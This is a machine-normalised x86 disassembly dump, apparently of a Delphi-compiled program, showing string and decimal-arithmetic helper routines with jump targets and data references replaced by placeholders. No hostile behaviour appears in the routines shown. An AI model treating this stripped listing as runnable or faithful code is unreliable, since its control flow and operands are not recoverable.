mov ebx eax
xor eax eax
push ebp
push sub_47959e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
call sub_478f44
test eax eax
jl r-xdata
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_4041b8
lea eax [ ebp - 0x8 ]
mov edx edi
call sub_4041b8
mov eax esi
mov edx r-xdata
call sub_404174
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4041b8
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4041b8
mov eax esi
call sub_404120
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404174
mov eax esi
mov ecx [ ebp - 0xc ]
mov edx r-xdata
call sub_40442c
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40452c
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40452c
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40452c
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40452c
jne r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404174
jmp r-xdata
mov [ ebp - 0x1d ] 0x0
mov eax [ ebp - 0x8 ]
call sub_4045e0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
call sub_4045e0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
call sub_4043e0
mov edi eax
mov eax [ ebp - 0xc ]
call sub_4043e0
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_42e3c8
mov ebx eax
mov eax esi
call sub_404120
test ebx ebx
jle r-xdata
mov eax esi
mov edx [ ebp - 0xc ]
call sub_404174
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404174
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4795a5
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404144
retn
cmp [ esi ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov ebx 0x1
mov eax esi
mov edx r-xdata
call sub_404174
mov [ ebp - 0x1e ] 0x30
mov edx [ ebp - 0x10 ]
mov al [ edx + eax ]
mov [ ebp - 0x1e ] al
jmp r-xdata
mov [ ebp - 0x1f ] 0x30
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov al [ eax + edx ]
mov [ ebp - 0x1f ] al
jmp r-xdata
cmp ebx [ ebp - 0x18 ]
jg r-xdata
mov eax edi
sub eax ebx
mov edx [ ebp - 0x18 ]
sub edx ebx
mov [ ebp - 0x1c ] edx
cmp edi ebx
jl r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x1d ]
mov dl [ ebp - 0x1f ]
mov al [ ebp - 0x1e ]
call sub_479210
mov ecx [ esi ]
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40442c
inc ebx
dec [ ebp - 0x24 ]
jne r-xdata
sub_4795c4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403b24#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x1d ] al
lea eax [ ebp - 0x1c ]
push eax
mov eax ebx
call sub_4043e0
push eax
mov eax esi
call sub_4043e0
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx esi
mov eax ebx
call sub_478ff8
mov eax [ ebp - 0x1c ]
call sub_4045e0
mov [ ebp - 0x14 ] eax
mov esi 0x1
xor edi edi
mov ebx [ ebp - 0x10 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax edi
xor edx edx
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_4086ac
cmp [ ebp - 0x8 ] 0xffffff01
je r-xdata
mov eax [ ebp - 0x18 ]
call sub_4086fc
mov edx [ ebp - 0x14 ]
movzx edx [ edx + ebx ]
sub edx 0x30
imul edx
imul esi
add edi eax
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
mov esi eax
dec ebx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4797a4
lea eax [ ebp - 0x40 ]
mov edx 0x5
call sub_404144
lea eax [ ebp - 0x24 ]
call sub_404120
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_404144
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4043e0
mov ebx eax
sub ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
test ebx ebx
jle r-xdata
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_402c88
lea eax [ ebp - 0x2c ]
mov dl [ ebp - 0x1d ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x2c ]
lea eax [ ebp - 0x28 ]
mov cl 0x2
call sub_402c58
lea edx [ ebp - 0x28 ]
lea eax [ ebp - 0x24 ]
call sub_404384
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov eax [ ebp - 0x4 ]
call sub_40442c
jmp r-xdata
test ebx ebx
jge r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx ebx
mov edx 0x1
call sub_404640
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
mov dl [ ebp - 0x1d ]
call sub_404308
push [ ebp - 0x34 ]
lea eax [ ebp - 0x38 ]
push eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp - 0x8 ]
call sub_404640
push [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4044a0
jmp r-xdata
lea eax [ ebp - 0x3c ]
mov dl [ ebp - 0x1d ]
call sub_404308
push [ ebp - 0x3c ]
lea ecx [ ebp - 0x40 ]
mov edx ebx
neg edx
mov al 0x30
call sub_4047d0
push [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4044a0
sub_4797b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov eax esi
call sub_4043e0
mov [ ebp - 0xa ] ax
mov eax esi
call sub_4045e0
movsx edi [ ebp - 0xa ]
mov edx edi
dec edx
add eax edx
mov [ ebp - 0x8 ] eax
mov edx edi
inc edx
mov eax ebx
call sub_40476c
mov eax [ ebx ]
call sub_4045e0
movsx edx [ ebp - 0xa ]
add eax edx
mov [ ebp - 0x4 ] eax
push ecx
push edi
push esi
push ebx
mov bh 0xa
mov edi [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov cx [ ebp - 0xa ]
mov dx 0x0
add dl 0x30
mov [ edi ] dl
pop ebx
pop esi
pop edi
pop ecx
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
mov al [ esi ]
sub esi 0x1
sub al 0x30
mul [ ebp + 0xc ]
add ax dx
mov dx 0x0
div bh
mov dl al
add ah 0x30
mov [ edi ] ah
sub edi 0x1
sub cx 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push ebx
mov eax [ ebx ]
call sub_4043e0
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404640
cmp cx 0x0
je r-xdata
sub_479864
push ebp
mov ebp esp
push ecx
mov ecx 0xa
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_479ac8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x20 ]
push eax
mov eax esi
call sub_4043e0
push eax
mov eax edi
call sub_4043e0
push eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx edi
mov eax esi
call sub_478ff8
mov eax [ ebp - 0x1c ]
call sub_4043e0
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x20 ]
call sub_4043e0
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
call sub_4045e0
mov edi eax
lea eax [ ebp - 0x10 ]
call sub_404120
mov esi [ ebp - 0xc ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax ebx
mov edx [ ebp - 0x14 ]
call sub_404174
jmp r-xdata
cmp [ ebp - 0x8 ] 0x9
jge r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov al [ edi + esi ]
sub al 0x30
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_4797b0
mov edx [ ebp - 0x34 ]
lea eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
call sub_40442c
mov eax [ ebp - 0x1c ]
call sub_4086fc
xor edx edx
mov dl [ edi + esi ]
sub edx 0x30
imul edx
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_4086ac
mov edx [ ebp - 0x30 ]
lea eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
call sub_40442c
jmp r-xdata
push ebx
mov eax [ ebx ]
call sub_4043e0
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404640
cmp [ ebp - 0x4 ] 0xffffff01
je r-xdata
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_479260
mov edx [ ebp - 0x38 ]
lea eax [ ebp - 0x14 ]
call sub_4041b8
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_4043e8
dec esi
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479acf
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_404144
lea eax [ ebp - 0x3c ]
mov edx 0x4
call sub_404144
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_404144
retn
mov eax [ ebx ]
call sub_4043e0
mov esi eax
sub esi [ ebp - 0x4 ]
test esi esi
jne r-xdata
test esi esi
jle r-xdata
mov edx r-xdata
lea eax [ ebp - 0x40 ]
call sub_402c88
lea eax [ ebp - 0x44 ]
mov dl [ ebp - 0x29 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x44 ]
lea eax [ ebp - 0x40 ]
mov cl 0x2
call sub_402c58
lea edx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
call sub_404384
mov edx [ ebp - 0x3c ]
mov ecx [ ebx ]
mov eax ebx
call sub_40442c
jmp r-xdata
test esi esi
jge r-xdata
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebx ]
mov ecx esi
mov edx 0x1
call sub_404640
push [ ebp - 0x48 ]
lea eax [ ebp - 0x4c ]
mov dl [ ebp - 0x29 ]
call sub_404308
push [ ebp - 0x4c ]
lea eax [ ebp - 0x50 ]
push eax
lea edx [ esi + 0x1 ]
mov eax [ ebx ]
mov ecx [ ebp - 0x4 ]
call sub_404640
push [ ebp - 0x50 ]
mov eax ebx
mov edx 0x3
call sub_4044a0
jmp r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x28 ]
cmp eax 0x400
jle r-xdata
lea eax [ ebp - 0x54 ]
mov dl [ ebp - 0x29 ]
call sub_404308
push [ ebp - 0x54 ]
lea ecx [ ebp - 0x58 ]
mov edx esi
neg edx
mov al 0x30
call sub_4047d0
push [ ebp - 0x58 ]
push [ ebx ]
mov eax ebx
mov edx 0x3
call sub_4044a0
mov eax ebx
call sub_404120
sub_479ae8
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x1 ]
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x2 ] al
push eax
push ebx
push ecx
push edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x1 ] 0x0
mov cl 0x0
mov ch 0x0
mov ah [ ebp + 0x8 ]
mov dl 0x0
mov dh 0x0
cmp al 0x0
je r-xdata
add dh al
mov dl 0x1
cmp cl 0x0
jne r-xdata
cmp al [ ebp - 0x2 ]
je r-xdata
cmp dh 0x6b
ja r-xdata
mov cl 0x1
mov dl 0x0
mov edi [ ebp + 0xc ]
jmp r-xdata
mov al [ edi ]
add edi 0x1
cmp dl 0x0
jne r-xdata
add ch 0x1
jmp r-xdata
cmp ch ah
ja r-xdata
add ah 0x1
pop edi
pop edx
pop ecx
pop ebx
pop eax
mov al [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0xc
mov [ ebp - 0x1 ] 0x1
sub_479b58
push ebx
push esi
push edi
mov esi eax
mov bl 0x1
mov eax esi
call sub_4043e0
test eax eax
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edi 0x1
inc edi
dec eax
jne r-xdata
sub dl 0x2
je r-xdata
mov dl [ esi + edi - 0x1 ]
sub dl 0x2e
je r-xdata
xor ebx ebx
jmp r-xdata
sub_479b8c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_479b58
test al al
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404174
jmp r-xdata
mov eax esi
call sub_479b58
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4045e0
push eax
mov eax esi
call sub_4045e0
push eax
push 0x9
call sub_479ae8
test al al
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_479864
mov ecx edi
mov edx esi
mov eax ebx
call sub_4795c4
jmp r-xdata
sub_479bfc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_479c9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_404174
mov eax esi
mov edx r-xdata
call sub_404174
jmp r-xdata
mov eax [ ebx ]
mov edx edi
call sub_478f44
test eax eax
jge r-xdata
mov eax [ esi ]
call sub_4086fc
inc eax
lea edx [ ebp - 0x8 ]
call sub_4085c0
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404174
lea ecx [ ebp - 0x10 ]
mov eax [ ebx ]
mov edx edi
call sub_4793c0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_478f08
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479ca4
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404144
retn
sub_479cbc
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_479e41
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ rw-data ]
mov bl [ ebx ]
mov eax edi
mov edx [ ebp - 0x4 ]
call sub_404174
jmp r-xdata
mov eax [ edi ]
cmp [ eax ] 0x30
je r-xdata
push edi
mov eax [ edi ]
call sub_4043e0
mov ecx eax
dec ecx
mov eax [ edi ]
mov edx 0x2
call sub_404640
test si si
jne r-xdata
test si si
jle r-xdata
mov ecx [ edi ]
mov eax edi
mov edx r-xdata
call sub_40442c
jmp r-xdata
mov eax [ edi ]
call sub_4043e0
movsx edx si
neg edx
cmp eax edx
jg r-xdata
mov edx r-xdata
lea eax [ ebp - 0xc ]
call sub_402c88
lea eax [ ebp - 0x10 ]
mov edx ebx
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov cl 0x2
call sub_402c58
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_404384
push [ ebp - 0x8 ]
lea ecx [ ebp - 0x14 ]
movsx edx si
mov al 0x30
call sub_4047d0
push [ ebp - 0x14 ]
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4044a0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479e48
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_404144
lea eax [ ebp - 0x8 ]
call sub_404120
retn
mov eax [ edi ]
call sub_4043e0
movsx edx si
neg edx
cmp eax edx
jle r-xdata
mov eax [ edi ]
call sub_4043e0
movsx edx si
neg edx
sub edx eax
lea ecx [ ebp - 0x18 ]
mov al 0x30
call sub_4047d0
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_4043e8
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
movsx ecx si
neg ecx
mov eax [ edi ]
mov edx 0x1
call sub_404640
push [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
mov edx ebx
call sub_404308
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi ]
call sub_4043e0
mov ecx eax
movsx edx si
neg edx
inc edx
mov eax [ edi ]
call sub_404640
push [ ebp - 0x24 ]
mov eax edi
mov edx 0x3
call sub_4044a0
sub_479e60
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4045d0
xor eax eax
push ebp
push sub_47a0bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0xd ] al
lea eax [ ebp - 0x14 ]
mov dl [ ebp - 0xd ]
call sub_404308
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_404724
mov esi eax
test si si
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov esi eax
dec esi
mov eax ebx
mov edx r-xdata
call sub_404174
mov eax ebx
mov edx r-xdata
call sub_404174
sub si 0x2
mov eax [ ebp - 0x4 ]
call sub_4045e0
mov al [ eax ]
cmp al [ ebp - 0xd ]
jne r-xdata
lea ecx [ ebp - 0x28 ]
mov edx esi
dec edx
mov eax [ ebx ]
call sub_479cbc
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_404174
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov edx eax
dec edx
lea ecx [ ebp - 0x24 ]
mov al 0x30
call sub_4047d0
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_40442c
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_40452c
jne r-xdata
mov al [ r-xdata ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0xd ]
call sub_404308
mov edx [ ebp - 0x1c ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_40d108
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x4 ]
call sub_4041b8
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_404640
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a0c2
lea eax [ ebp - 0x34 ]
mov edx 0x9
call sub_404144
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404144
retn
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4041b8
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_4041b8
mov eax [ ebp - 0xc ]
call sub_4043e0
mov edi eax
dec edi
lea ecx [ ebp - 0x2c ]
movsx edx di
mov al 0x30
call sub_4047d0
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0xc ]
call sub_4043e8
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_478f44
test eax eax
jge r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40452c
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4045e0
cmp [ eax ] 0x30
je r-xdata
mov eax ebx
call sub_404120
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043e8
mov eax ebx
mov edx r-xdata
call sub_4043e8
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_404640
dec esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40452c
je r-xdata
lea ecx [ ebp - 0x34 ]
mov eax [ ebx ]
mov edx esi
call sub_479cbc
mov edx [ ebp - 0x34 ]
mov eax ebx
call sub_404174
mov eax [ ebx ]
call sub_4043e0
movsx edx di
add edx 0x40
cmp eax edx
jl r-xdata
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_479bfc
mov edx [ ebp - 0x30 ]
mov eax ebx
call sub_4043e8
lea eax [ ebp - 0xc ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_40442c
sub_47a0f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4045d0
mov eax [ ebp - 0x8 ]
call sub_4045d0
xor eax eax
push ebp
push j_sub_403b24#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4045e0
mov al [ eax ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4045e0
pop edx
cmp dl [ eax ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4045e0
mov bl [ eax ]
cmp bl 0x2d
je r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4045e0
cmp [ eax ] 0x2d
jne r-xdata
mov al 0x1
cmp bl 0x2d
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4045e0
cmp [ eax ] 0x2d
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_404640
mov eax [ ebp - 0x4 ]
call sub_4045e0
cmp [ eax ] 0x30
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4043e0
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_404640
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_404640
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_4045e0
cmp [ eax ] 0x30
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4043e0
mov ecx eax
dec ecx
mov edx 0x2
mov eax [ ebp - 0x8 ]
call sub_404640
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_479e60
lea ecx [ ebp - 0xc ]
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_479b8c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404174
test bl bl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a258
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404144
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_40442c
sub_47a26c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47a348
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_479b58
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_40452c
jne r-xdata
mov eax esi
call sub_479b58
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_40452c
jne r-xdata
mov eax edi
mov edx ebx
call sub_404174
jmp r-xdata
test ebx ebx
je r-xdata
mov edx esi
mov eax ebx
call sub_408180
test eax eax
jne r-xdata
mov eax edi
mov ecx ebx
mov edx r-xdata
call sub_40442c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a34f
lea eax [ ebp - 0x4 ]
call sub_404120
retn
mov eax edi
mov edx r-xdata
call sub_404174
jmp r-xdata
mov eax ebx
mov edx r-xdata
call sub_40452c
jne r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_47a0f4
mov eax edi
mov edx r-xdata
call sub_404174
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov eax [ ebp - 0x4 ]
call sub_4784d8
jmp r-xdata
sub_47a3b8
cmp cl ch
jae r-xdata
retn
mov ah dl
add cl 0x1
cmp cl ch
jne r-xdata
lodsb [ esi ]
mov dl al
shr al 0x4
mov al 0x0
jmp r-xdata
and ah 0xf
shl ah 0x4
or ah al
mov al ah
stosb [ edi ]
add cl 0x1
jmp sub_47a3b8
sub_47a3f0
push ebp
mov ebp esp
push esi
push edi
push ebx
push ecx
push edx
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov cl [ ebp + 0x10 ]
mov ch [ ebp + 0xc ]
cmp cl [ ebp + 0x18 ]
ja r-xdata
sub cl [ ebp + 0x18 ]
cmp cl [ ebp + 0x18 ]
je r-xdata
mov ch [ ebp + 0xc ]
mov cl [ ebp + 0x18 ]
cmp ch [ ebp + 0x14 ]
jae r-xdata
sub cl 0x1
cmp cl 0x0
je r-xdata
add cl [ ebp + 0x14 ]
call sub_47a3a8
cmp ch [ ebp + 0x14 ]
je r-xdata
mov ah [ ebp + 0x18 ]
sub ah [ ebp + 0x10 ]
mov cl [ ebp + 0x18 ]
add cl [ ebp + 0x14 ]
add cl ch
jmp r-xdata
lodsb [ esi ]
mov dl al
shr al 0x4
or al 0x0
stosb [ edi ]
mov al dl
mov ah [ ebp + 0x18 ]
mov [ ebp + 0x10 ] ah
mov cl 0x1
jmp r-xdata
mov al 0x0
stosb [ edi ]
sub cl 0x1
jmp r-xdata
pop edx
pop ecx
pop ebx
pop edi
pop esi
pop ebp
retn 0x18
mov cl ch
call sub_47a3e0
jmp r-xdata
lodsb [ esi ]
cmp al 0x0
je r-xdata
sub cl [ ebp + 0x18 ]
call sub_47a3e0
call sub_47a3a8
mov cl [ ebp + 0x10 ]
cmp cl [ ebp + 0x18 ]
jbe r-xdata
mov dl al
cmp ch [ ebp + 0x14 ]
jbe r-xdata
cmp cl 0x0
je r-xdata
sub ah 0x1
cmp ah 0x0
je r-xdata
mov [ edi ] al
add edi 0x1
add ch [ ebp + 0x10 ]
mov cl 0x0
call sub_47a3b8
mov cl [ ebp + 0xc ]
cmp cl [ ebp + 0x14 ]
jbe r-xdata
mov ch [ ebp + 0x14 ]
sub ah 0x1
sub cl 0x2
jmp r-xdata
sub cl [ ebp + 0x14 ]
call sub_47a3e0
jmp r-xdata
cmp ah 0x0
je r-xdata
sub_47a4d4
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov al [ eax ]
mov [ ebp - 0x1 ] al
push esi
push edi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
xor ecx ecx
mov cx [ ebp + 0x8 ]
mov dl 0x0
cld
loop r-xdata
sub al 0x30
cmp dl 0x0
jne r-xdata
lodsb [ esi ]
cmp al [ ebp - 0x1 ]
je r-xdata
cmp dl 0x0
je r-xdata
or al ah
stosb [ edi ]
shl al 0x4
mov ah al
jmp r-xdata
pop ebx
pop edi
pop esi
pop ecx
pop ebp
retn 0xc
mov al ah
stosb [ edi ]
not dl
sub_47a520
push ebx
push esi
push edi
add esp 0xffffffdc
mov edx [ rw-data ]
mov dl [ edx ]
mov [ esp + 0x1 ] dl
mov esi eax
mov [ esp ] 0x0
jmp r-xdata
mov bl [ esi ]
test bl bl
jne r-xdata
push esi
mov esi r-xdata
lea edi [ esp + 0x8 ]
mov ecx 0x8
[ edi ] [ esi ]
pop esi
mov al [ esp + 0x1 ]
and eax 0xff
bts [ esp + 0x4 ] eax
and ebx 0xff
bt [ esp + 0x4 ] ebx
jb r-xdata
mov al [ esp ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
inc esi
mov [ esp ] 0x1
jmp r-xdata
sub_47a5a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
